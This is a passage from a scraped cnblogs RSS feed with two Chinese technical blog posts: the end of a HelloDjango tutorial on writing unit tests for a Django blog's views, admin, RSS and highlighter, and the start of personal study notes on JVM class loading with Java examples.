&lt;li&gt;文章内容被 markdown 渲染，并生成了目录。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;测试代码如下：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;class PostDetailViewTestCase(BlogDataTestCase):
    def setUp(self):
        super().setUp()
        self.md_post = Post.objects.create(
            title='Markdown 测试标题',
            body='# 标题',
            category=self.cate1,
            author=self.user,
        )
        self.url = reverse('blog:detail', kwargs={'pk': self.md_post.pk})

    def test_good_view(self):
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed('blog/detail.html')
        self.assertContains(response, self.md_post.title)
        self.assertIn('post', response.context)

    def test_visit_a_nonexistent_post(self):
        url = reverse('blog:detail', kwargs={'pk': 100})
        response = self.client.get(url)
        self.assertEqual(response.status_code, 404)

    def test_increase_views(self):
        self.client.get(self.url)
        self.md_post.refresh_from_db()
        self.assertEqual(self.md_post.views, 1)

        self.client.get(self.url)
        self.md_post.refresh_from_db()
        self.assertEqual(self.md_post.views, 2)

    def test_markdownify_post_body_and_set_toc(self):
        response = self.client.get(self.url)
        self.assertContains(response, '文章目录')
        self.assertContains(response, self.md_post.title)

        post_template_var = response.context['post']
        self.assertHTMLEqual(post_template_var.body_html, &quot;&amp;lt;h1 id='标题'&amp;gt;标题&amp;lt;/h1&amp;gt;&quot;)
        self.assertHTMLEqual(post_template_var.toc, '&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#标题&quot;&amp;gt;标题&amp;lt;/li&amp;gt;')&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来是测试 admin 添加文章和 rss 订阅内容，这一块比较简单，因为大部分都是 django 的逻辑，django 已经为我们进行了测试，我们需要测试的只是自定义的部分，确保自定义的逻辑按照预期的定义运行，并且得到了预期的结果。&lt;/p&gt;
&lt;p&gt;对于 admin，预期的结果就是发布文章后，的确自动填充了 author：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;class AdminTestCase(BlogDataTestCase):
    def setUp(self):
        super().setUp()
        self.url = reverse('admin:blog_post_add')

    def test_set_author_after_publishing_the_post(self):
        data = {
            'title': '测试标题',
            'body': '测试内容',
            'category': self.cate1.pk,
        }
        self.client.login(username=self.user.username, password='admin')
        response = self.client.post(self.url, data=data)
        self.assertEqual(response.status_code, 302)

        post = Post.objects.all().latest('created_time')
        self.assertEqual(post.author, self.user)
        self.assertEqual(post.title, data.get('title'))
        self.assertEqual(post.category, self.cate1)&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;reverse('admin:blog_post_add')&lt;/code&gt; 获取 admin 管理添加博客文章的 URL，django admin 添加文章的视图函数名为 &lt;code&gt;admin:blog_post_add&lt;/code&gt;，一般 admin 后台操作模型的视图函数命名规则是 &lt;code&gt;&amp;lt;app_label&amp;gt;_&amp;lt;model_name&amp;gt;_&amp;lt;action&amp;gt;&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;self.client.login(username=self.user.username, password='admin')&lt;/code&gt; 登录用户，相当于后台登录管理员账户。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;self.client.post(self.url, data=data)&lt;/code&gt; ，向添加文章的 url 发起 post 请求，post 的数据为需要发布的文章内容，只指定了 title，body和分类。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;接着我们进行一系列断言，确认是否正确创建了文章。&lt;/p&gt;
&lt;p&gt;RSS 测试也类似，我们期待的是，它返回的内容中的确包含了全部文章的内容：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;class RSSTestCase(BlogDataTestCase):

    def setUp(self):
        super().setUp()
        self.url = reverse('rss')

    def test_rss_subscription_content(self):
        response = self.client.get(self.url)
        self.assertContains(response, AllPostsRssFeed.title)
        self.assertContains(response, AllPostsRssFeed.description)
        self.assertContains(response, self.post1.title)
        self.assertContains(response, self.post2.title)
        self.assertContains(response, '[%s] %s' % (self.post1.category, self.post1.title))
        self.assertContains(response, '[%s] %s' % (self.post2.category, self.post2.title))
        self.assertContains(response, self.post1.body)
        self.assertContains(response, self.post2.body)&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;测试模板标签&quot;&gt;测试模板标签&lt;/h2&gt;
&lt;p&gt;这里测试的核心内容是，模板中 &lt;code&gt;{% templatetag %}&lt;/code&gt; 被渲染成了正确的 HTML 内容。你可以看到测试代码中对应的代码：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;context = Context(show_recent_posts(self.ctx))
template = Template(
    '{% load blog_extras %}'
    '{% show_recent_posts %}'
)
expected_html = template.render(context)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意模板标签本质上是一个 Python 函数，第一句代码中我们直接调用了这个函数，由于它需要接受一个 Context 类型的标量，因此我们构造了一个空的 context 给它，调用它将返回需要的上下文变量，然后我们构造了一个需要的上下文变量。&lt;/p&gt;
&lt;p&gt;接着我们构造了一个模板对象。&lt;/p&gt;
&lt;p&gt;最后我们使用构造的上下文去渲染了这个模板。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;我们调用了模板引擎的底层 API 来渲染模板，视图函数会渲染模板，返回响应，但是我们没有看到这个过程，是因为 django 帮我们在背后的调用了这个过程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;全部模板引擎的测试套路都是一样，构造需要的上下文，构造模板，使用上下文渲染模板，断言渲染的模板内容符合预期。以为例：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def test_show_recent_posts_with_posts(self):
    post = Post.objects.create(
        title='测试标题',
        body='测试内容',
        category=self.cate,
        author=self.user,
    )
    context = Context(show_recent_posts(self.ctx))
    template = Template(
        '{% load blog_extras %}'
        '{% show_recent_posts %}'
    )
    expected_html = template.render(context)
    self.assertInHTML('&amp;lt;h3 class=&quot;widget-title&quot;&amp;gt;最新文章&amp;lt;/h3&amp;gt;', expected_html)
    self.assertInHTML('&amp;lt;a href=&quot;{}&quot;&amp;gt;{}&amp;lt;/a&amp;gt;'.format(post.get_absolute_url(), post.title), expected_html)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个模板标签对应侧边栏的最新文章版块。我们进行了2处关键性的内容断言。一个是包含最新文章版块标题，一个是内容中含有文章标题的超链接。&lt;/p&gt;
&lt;h2 id=&quot;测试辅助方法和类&quot;&gt;测试辅助方法和类&lt;/h2&gt;
&lt;p&gt;我们的博客中只自定义了关键词高亮的一个逻辑。&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;class HighlighterTestCase(TestCase):
    def test_highlight(self):
        document = &quot;这是一个比较长的标题，用于测试关键词高亮但不被截断。&quot;
        highlighter = Highlighter(&quot;标题&quot;)
        expected = '这是一个比较长的&amp;lt;span class=&quot;highlighted&quot;&amp;gt;标题&amp;lt;/span&amp;gt;，用于测试关键词高亮但不被截断。'
        self.assertEqual(highlighter.highlight(document), expected)

        highlighter = Highlighter(&quot;关键词高亮&quot;)
        expected = '这是一个比较长的标题，用于测试&amp;lt;span class=&quot;highlighted&quot;&amp;gt;关键词高亮&amp;lt;/span&amp;gt;但不被截断。'
        self.assertEqual(highlighter.highlight(document), expected)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里 Highlighter 实例化时接收搜索关键词作为参数，然后 highlight 将搜索结果中关键词包裹上 span 标签。&lt;/p&gt;
&lt;p&gt;Highlighter 事实上 haystack 为我们提供的类，我们只是定义了 highlight 方法的逻辑。我们又是如何知道 highlight 方法的逻辑呢？如何进行测试呢？&lt;/p&gt;
&lt;p&gt;我是看源码，大致了解了 Highlighter 类的实现逻辑，然后我从 haystack 的测试用例中找到了 highlight 的测试方法。&lt;/p&gt;
&lt;p&gt;所以，有时候不要惧怕去看源代码，Python 世界里一切都是开源的，源代码也没有什么神秘的地方，都是人写的，别人能写出来，你学习后也一样能写出来。单元测试的代码一般比较冗长重复，但目的也十分明确，而且大都以顺序逻辑组织，代码自成文档，非常好读。&lt;/p&gt;
&lt;p&gt;单纯看文章中的讲解你可能仍有迷惑，但是好好读一遍示例项目中测试部分的源代码，你一定会对单元测试有一个更加清晰的认识，然后依葫芦画瓢，写出对自己项目代码的单元测试。&lt;/p&gt;
&lt;h2 id=&quot;hellodjango-往期回顾&quot;&gt;HelloDjango 往期回顾：&lt;/h2&gt;
&lt;p&gt;第 28 篇：&lt;a href=&quot;https://www.cnblogs.com/xueweihan/p/12304983.html&quot;&gt;Django Haystack 全文检索与关键词高亮&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第 27 篇：&lt;a href=&quot;https://www.cnblogs.com/xueweihan/p/12171812.html&quot;&gt;开启 Django 博客实现简单的全文搜索&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第 26 篇：&lt;a href=&quot;https://www.cnblogs.com/xueweihan/p/12141772.html&quot;&gt;开启 Django 博客的 RSS 功能&lt;/a&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/759200/202002/759200-20200213201956024-782757549.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关注公众号加入交流群&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 21 Feb 2020 00:14:00 +0000</pubDate>
<dc:creator>削微寒</dc:creator>
<og:description>作者： &amp;quot;HelloGitHub 追梦人物&amp;quot; 文中所涉及的示例代码，已同步更新到 &amp;quot;HelloGitHub Team 仓库&amp;quot; 我们博客功能越来越来完善了，但这也</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xueweihan/p/12336462.html</dc:identifier>
</item>
<item>
<title>深入理解JVM（学习过程） - 我不是铁杆啊</title>
<link>http://www.cnblogs.com/wobushitiegan/p/12340091.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wobushitiegan/p/12340091.html</guid>
<description>&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;/&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;/&gt;&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;/&gt;&lt;meta property=&quot;og:description&quot; content=&quot;深入理解JVM 这，仅是我学习过程中记录的笔记。确定了一个待研究的主题，对这个主题进行全方面的剖析。笔记是用来方便我回顾与学习的，欢迎大家与我进行交流沟通，共同成长。不止是技术。 2020年02月06&quot;/&gt;&lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;no-transform&quot;/&gt;&lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;no-siteapp&quot;/&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;/&gt;&lt;title&gt;深入理解JVM（学习过程） - 我不是铁杆啊 - 博客园&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/blog-common.min.css?v=PEqf9X5sM-TqgxEJ-34zllMNrLPY7PzC3YhmnDnLGWA&quot; type=&quot;text/css&quot;/&gt;&lt;link id=&quot;MainCss&quot; rel=&quot;stylesheet&quot; href=&quot;/skins/custom/bundle-custom.min.css?v=1ssrnY3Il79Ok472qeVrpxlSprSXcHhYPgZC5S3wtVM&quot; type=&quot;text/css&quot;/&gt;&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;https://www.cnblogs.com/wobushitiegan/custom.css?v=E12RB34x4b10l2Xm8jPcPLAb5Ns=&quot;/&gt;&lt;link id=&quot;mobile-style&quot; media=&quot;only screen and (max-width: 767px)&quot; type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;/skins/custom/bundle-custom-mobile.min.css?v=m3EDfkzWxyr59QpsMnTcyqVxwFbVIdAtRy2EooJcJ94&quot;/&gt;&lt;link type=&quot;application/rss+xml&quot; rel=&quot;alternate&quot; href=&quot;https://www.cnblogs.com/wobushitiegan/rss&quot;/&gt;&lt;link type=&quot;application/rsd+xml&quot; rel=&quot;EditURI&quot; href=&quot;https://www.cnblogs.com/wobushitiegan/rsd.xml&quot;/&gt;&lt;link type=&quot;application/wlwmanifest+xml&quot; rel=&quot;wlwmanifest&quot; href=&quot;https://www.cnblogs.com/wobushitiegan/wlwmanifest.xml&quot;/&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;1043.5101438913&quot;&gt;

&lt;div id=&quot;home&quot;&gt;

&lt;div id=&quot;main&quot;&gt;
&lt;div id=&quot;mainContent&quot;&gt;
&lt;div class=&quot;forFlow&quot;&gt;
&lt;div id=&quot;post_detail&quot;&gt;
&lt;div id=&quot;topics&quot;&gt;
&lt;div class=&quot;post&quot;&gt;


&lt;div class=&quot;postBody&quot; readability=&quot;58.5&quot;&gt;
&lt;div id=&quot;cnblogs_post_body&quot; class=&quot;blogpost-body cnblogs-markdown&quot; readability=&quot;123&quot;&gt;

&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;这，仅是我学习过程中记录的笔记。确定了一个待研究的主题，对这个主题进行全方面的剖析。笔记是用来方便我回顾与学习的，欢迎大家与我进行交流沟通，共同成长。不止是技术。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;2020年02月06日22:43:09 - 记录学习过程&lt;/p&gt;
&lt;p&gt;终于开始了。在学习这个之前，看了zhanglong老师的 java 8 和springboot&lt;/p&gt;
&lt;p&gt;迫不及待了。先开始吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;写在前边&quot;&gt;写在前边&lt;/h2&gt;
&lt;h4 id=&quot;论方法论&quot;&gt;论方法论&lt;/h4&gt;
&lt;p&gt;听说之前还有netty 和 kotlin 。学习风格就是，每一门课程之前，前两节课不进入主题，讲方法论。&lt;/p&gt;
&lt;p&gt;从他人身上学习优点。加强自己的学习。从人去学习，从事去学习。我们只有亲身经历一件事情，才会产生自己的想法。从事情学习付出的成本会相对的高一点。只有一件事，你失败了，才会发现你存在什么问题。从过程中吸收一点经验，指导着你未来学习前进的方向。从人去学习来说，不是你自己亲身经历的，要学习辨别能力。为什么大家在看书的时候，看书的印象不如你自己操作的印象深刻呢？这些都是值得去思考的。更为高效的方式，还是看别人的故事，揣摩自己的人生。将别人拥有的技能转换成自己的技能，这样才是高效的学习。&lt;/p&gt;
&lt;p&gt;学习的过程中，一定要做到两点。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;输入。输入是必要的。&lt;/li&gt;
&lt;li&gt;有输入，必定要有输出。记笔记，写博客，给别人去讲。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;能给别人讲明白的前提是自己要明白。自己明白了，就一定能给别人讲明白了吗？你自己明白，给别人讲完之后，你自己也不明白了（值得反思一下，之前学习消耗的时间是否是高效的）。&lt;/p&gt;
&lt;p&gt;每个人都值得去自己思考这个问题。为什么当时学习的时候学习的非常透彻，过一段时间跟没学过一样？产生这种问题的根源是什么呢？为什么会产生这样的问题？《后会无期》电影。它是没有标准答案的。之所以看了很多书，看了很多视频，看了很多资料，为什么没有产生持久化的效果？什么是持久化，他要最终落实到一个存储上边。在学习技术的时候，不断的在脑海中去过滤。在当时看的时候会认识的非常时刻。只有输入，没有输出，肯定保存的时间不会太长。什么是输出呢？在学习的过程中，一定要把输入的东西给吐出来，选择一种最适合你的输出方式。就像人呼吸，如果光吸气，不吐气，人早就憋死了。所以输入和输出一定是同时存在的。通过输出，把当时学习到的知识点，以文字，图表，思维导图的方式给呈现出来。做到这一点，你会很难忘掉你学过的重要的内容。做项目的过程也是很重要的输出过程，不经意间，就记住了。刻意练习，针对某一门技术有意为之。刻意输出，当你忘记的时候，回顾一下，会很快的回忆起你之前的学习过程。&lt;/p&gt;
&lt;p&gt;即便你在多大的公司，你了解到的技术，用到的技术只占冰山一角。不要把个人绑死在一个上面。当你脱离当前工作时，你还有竞争力才是有用的。不能说项目用什么学什么。不用什么不学什么。那简直就不是程序员。学习技术，百里无一害。就算你现在用不到，你觉得重要的东西一定要去学，去输出。可以做一个实验。半天时间各学一个框架，一个记笔记，一个不记笔记。可以看一下实验结果。学习视频是一种很好的方式，不建议多次去重复的看视频。把视频中的技术要点吸收成你自己的东西才是重要的。视频不能用来检索。&lt;/p&gt;
&lt;p&gt;印象笔记，有道云笔记，小小的工具，可能给你生活带来很大的改变。甚至改变你的一生。讲课是一件非常辛苦的事情。平时的工作中就深有体会。&lt;/p&gt;
&lt;h4 id=&quot;论学习曲线&quot;&gt;论学习曲线&lt;/h4&gt;
&lt;p&gt;如果去学习JVM，每一个来学习JVM的人，都渴望成功。每一个Java开发人员的终极目标都是在日常生活中深入理解JVM的运行原理。JVM和平时的应用框架明显的区别，应用框架学习之后，可以直接拿来写项目了，就可以运行起来看到helloworld。然而对于JVM，是一个特别枯燥的事情。涵盖的内容太多了。本次根据java8来学习。必须要笔记。因为一扭头就会忘记。绝对没有速成的，突击的。有节奏，有计划的去学习。关于这门技术，范围太广，从通用的层面来进行学习。&lt;/p&gt;
&lt;p&gt;推荐一些学习资料：一边学习视频，一边学习资料；&lt;/p&gt;
&lt;p&gt;《深入理解Java虚拟机》 ， 《深入Java虚拟机》 ， R大&lt;/p&gt;
&lt;p&gt;可能会遇到的问题：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;学习了十几节课，感觉什么都没有学到。学到的东西在平时用不上。&lt;/li&gt;
&lt;li&gt;学习完JVM之后，可能会感觉，学的越多，不知道的越多。大功已成。以前没听过的，现在听过了。&lt;/li&gt;
&lt;li&gt;学习JVM，期间学习的文档全是英文的。阅读能力制约了你对JVM的学习。&lt;/li&gt;
&lt;li&gt;耐心。任重而道远。看不到曙光的那种。没有案例让你来做。沉下心来，有的放矢的推进。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;开发过程中遇到问题是常态。如果遇到了JVM崩溃，就算你拿到了日志，你也不能定位到问题是什么。对于原理，对于基础的学习，能够增强我们的自信心。&lt;/p&gt;
&lt;h4 id=&quot;课程大纲&quot;&gt;课程大纲&lt;/h4&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;strong&gt;介绍：&lt;/strong&gt;JVM是一个令人望而却步的领域，因为它博大精深，涉及到的内容与知识点非常之多。虽然Java开发者每天都在使用JVM，但对其有所研究并且研究深入的人却少之又少。然而，JVM的重要性却又是不言而喻的。基于JVM的各种动态与静态语言生态圈已经异常繁荣了，对JVM的运行机制有一定的了解不但可以提升我们的竞争力，还可以让我们在面对问题时能够沉着应对，加速问题的解决速度；同时还能够增强我们的自信心，让我们更加游刃有余。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;JVM介绍&lt;/li&gt;
&lt;li&gt;HotSpot虚拟机讲解&lt;/li&gt;
&lt;li&gt;垃圾收集方式详解&lt;/li&gt;
&lt;li&gt;垃圾收集算法详解&lt;/li&gt;
&lt;li&gt;垃圾收集器详解&lt;/li&gt;
&lt;li&gt;分代垃圾收集机制详解&lt;/li&gt;
&lt;li&gt;新生代讲解&lt;/li&gt;
&lt;li&gt;老年代讲解&lt;/li&gt;
&lt;li&gt;G1收集器分析与实例&lt;/li&gt;
&lt;li&gt;常见且重要虚拟机参数示例&lt;/li&gt;
&lt;li&gt;栈&lt;/li&gt;
&lt;li&gt;方法区&lt;/li&gt;
&lt;li&gt;线程共享内存区&lt;/li&gt;
&lt;li&gt;根搜索算法&lt;/li&gt;
&lt;li&gt;Serial收集器&lt;/li&gt;
&lt;li&gt;ParNew收集器&lt;/li&gt;
&lt;li&gt;类加载机制详解&lt;/li&gt;
&lt;li&gt;类加载的双亲委托机制&lt;/li&gt;
&lt;li&gt;字节码文件生成与分析&lt;/li&gt;
&lt;li&gt;魔数&lt;/li&gt;
&lt;li&gt;常量池与方法表&lt;/li&gt;
&lt;li&gt;各种指令详解&lt;/li&gt;
&lt;li&gt;锁详解&lt;/li&gt;
&lt;li&gt;线程安全&lt;/li&gt;
&lt;li&gt;偏向锁、自旋锁与轻量级锁&lt;/li&gt;
&lt;li&gt;JIT编译器&lt;/li&gt;
&lt;li&gt;GC日志生成与分析&lt;/li&gt;
&lt;li&gt;虚拟机监控工具详解&lt;/li&gt;
&lt;li&gt;jConsole使用方式详解&lt;/li&gt;
&lt;li&gt;何为逃逸与逃逸分析&lt;/li&gt;
&lt;li&gt;方法内联&lt;/li&gt;
&lt;li&gt;虚拟机内存模型详解&lt;/li&gt;
&lt;li&gt;= = = = = = = = = = = =&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;以前都不知道这些工具的存在：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;jConsole&lt;/p&gt;
&lt;p&gt;Jvusualvm&lt;/p&gt;
&lt;p&gt;jmap&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbn4j6o72lj31000u0aft.jpg&quot; alt=&quot;image-20200207000103348&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;类加载&quot;&gt;类加载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ul readability=&quot;2&quot;&gt;&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;在Java代码中，&lt;strong&gt;类型&lt;/strong&gt;的&lt;strong&gt;加载、连接与初始化&lt;/strong&gt;过程都是在程序运行期间完成的。&lt;/p&gt;
&lt;p&gt;（类型，并不代表类产生的对象，而是类本身。类型是在程序运行期间生成出来的，run time）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;提供了更大的灵活性，增加了更多的可能性&lt;/p&gt;
&lt;p&gt;（为有创意的开发者提供了很多的功能。）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;类加载器深入剖析&quot;&gt;类加载器深入剖析&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;Java虚拟机与程序的生命周期&lt;/li&gt;
&lt;li&gt;在如下几种情况下，Java虚拟机将结束生命周期
&lt;ul&gt;&lt;li&gt;执行了System.exit()方法&lt;/li&gt;
&lt;li&gt;程序正常执行结束&lt;/li&gt;
&lt;li&gt;程序在执行过程中遇到了异常或者错误而异常终止&lt;/li&gt;
&lt;li&gt;由于操作系统出现错误而导致Java虚拟机进行终止&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;类的加载连接与初始化&quot;&gt;类的加载、连接与初始化&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;加载： 查找并加载类的二进制数据&lt;/li&gt;
&lt;li&gt;连接
&lt;ul&gt;&lt;li&gt;-验证：确保被加载的类的正确性&lt;/li&gt;
&lt;li&gt;-准备：为类的静态变量分配内存，并将其初始化为默认值&lt;/li&gt;
&lt;li&gt;-解析：把类中的符号引用转换为直接引用&lt;/li&gt;
&lt;li&gt;初始化：为类的静态变量赋予正确的初始值&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;使用&lt;/li&gt;
&lt;li&gt;卸载&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;从代码来理解： 
class Test{
  public static int a = 1;
}
//我们程序中给定的是  public static int a = 1;
//但是在加载过程中的步骤如下：

1. 加载阶段
  编译文件为class文件，然后通过类加载，加载到JVM
  
2. 连接阶段
 第一步（验证）：确保Class类文件没问题
  第二步（准备）：先初始化为 a=0。（因为你int类型的初始值为0）
 第三步（解析）：将引用转换为直接引用

3. 初始化阶段：
  通过此解析阶段，把1赋值为变量a

4. 使用阶段
  我们平时使用的对象，操作，方法调用，等等都是使用阶段
  
5. 卸载阶段
  类在卸载之后，就不能够继续new对象，平时开发很少接触到这个卸载阶段。比如-OSGI技术会使用到卸载&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图解：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbp3cau4obj31hk0u0jzs.jpg&quot; alt=&quot;image-20200208165100079&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Java程序对类的使用方式可分为两种
&lt;ul&gt;&lt;li&gt;主动使用（七种）
&lt;ul&gt;&lt;li&gt;创建类的使用&lt;/li&gt;
&lt;li&gt;访问某个类或者接口的静态变量，或者对该静态变量赋值&lt;/li&gt;
&lt;li&gt;调动类的静态方法（助记符: getstatic putstatic invokestatic ）&lt;/li&gt;
&lt;li&gt;反射（如：Class.forName(&quot;com.test.Test&quot;)）&lt;/li&gt;
&lt;li&gt;初始化一个类的子类&lt;/li&gt;
&lt;li&gt;Java虚拟机启动时被表明为启动类的类（Java Test）&lt;/li&gt;
&lt;li&gt;JDK1.7开始提供的动态语言支持&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;被动使用
&lt;ul&gt;&lt;li&gt;除了以上七种主动使用的情况，其他使用Java类的方式都被看做是对类的被动使用，都不会导致类的初始化。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;所有Java虚拟机实现必须在每个类或者接口被Java程序“&lt;strong&gt;首次主动使用&lt;/strong&gt;”时才初始化他们&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;类的加载&quot;&gt;类的加载&lt;/h3&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;类的加载指的是将类的.class文件中二进制数据读入到内存中，将其放在运行时数据区内的方法去内，然后再内存中创建一个&lt;code&gt;java.lang.Class&lt;/code&gt;对象（规范并未说明Class对象谓语哪里，HotSpot虚拟机将其放在了方法去中）用来封装类在方法区内的数据结构&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;加载.class文件的方式
&lt;ul&gt;&lt;li&gt;从本地系统中直接加载&lt;/li&gt;
&lt;li&gt;通过网络下载.class文件&lt;/li&gt;
&lt;li&gt;从zip，jar等归档文件中加载.class文件&lt;/li&gt;
&lt;li&gt;从专有数据库中提取.class文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;将Java源文件动态编译为.class文件&lt;/strong&gt;（动态代理，web开发jsp转成servlet）&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/*
举例说明：
    对于静态字段来说，只有直接定义了该字段的类才会被初始化；
    当一个类在初始化是，要求其父类全部都已经初始化完毕了；
    -XX:+TraceClassLoading,用于追种类的加载信息并打印出来。
    
    所有的参数都是：
    -XX:+&amp;lt;option&amp;gt; ， 表示开启option选项
    -XX:+&amp;lt;option&amp;gt; ，表示关闭option选项
    -XX:+&amp;lt;option&amp;gt;=&amp;lt;value&amp;gt;  表示将option选项的值设置为value
    
*/
public class MyTest1 {
    public static void main (String[] args){
        System.out.println(MyChild1.str2);
    }
}

class MyParent1{
    public static String str = &quot;hello world&quot;;
    static {
        System.out.println(&quot;MyParent1 static block&quot;);
    }
}

class MyChild1 extends MyParent1{
    public static String str2 = &quot;welcome&quot;;
    static{
        System.out.println(&quot;MyChild1 static block&quot;);
    }
}

输出结果：
&amp;gt; Task :MyTest1.main()
MyParent1 static block
MyChild1 static block
welcome
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看类的加载信息，并打印出来。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;jvm 参数介绍：&lt;br/&gt;-XX:+&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;， 表示开启option选项&lt;br/&gt;-XX:+ ，表示关闭option选项&lt;br/&gt;-XX:+= 表示将option选项的值设置为value&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbp4h9196tj31bj0u0jy3.jpg&quot; alt=&quot;image-20200208173021317&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;类加载基础概念&quot;&gt;类加载基础概念&lt;/h3&gt;
&lt;h4 id=&quot;常量池的概念&quot;&gt;常量池的概念&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/*
  常量在编译阶段会存入到调用这个常量的方法所在的类的常量池中，本质上，调用类并没有直接用用到定义常量的类，因此并不会触发定义常量的类的初始化。
  注意：这里指的是将常量存放到了MyTest2的常量池中，之后MyTest2与MyParent2就没有任何关系了。
  甚至，我们可以将MyParent2的Class文件删除

*/
public class MyTest2{
  public static void main(String[] args){
    System.out.println(MyParent2.str);
  }
}

class MyParent2{
   public static final String str = &quot;hello world&quot;;
   public static final short s = 127;
   public static final int a = 3;
   public static final int m = 6;
  
   static {
    System.out.println(&quot;Myparent2 static block&quot;);// 这一行能输出吗？不会
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;反编译&quot;&gt;&lt;strong&gt;反编译&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;javap -c com.erwa.jvm.class.mytest2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;反编译之后会有助记符。&lt;/p&gt;
&lt;h4 id=&quot;助记符&quot;&gt;&lt;strong&gt;助记符&lt;/strong&gt;&lt;/h4&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
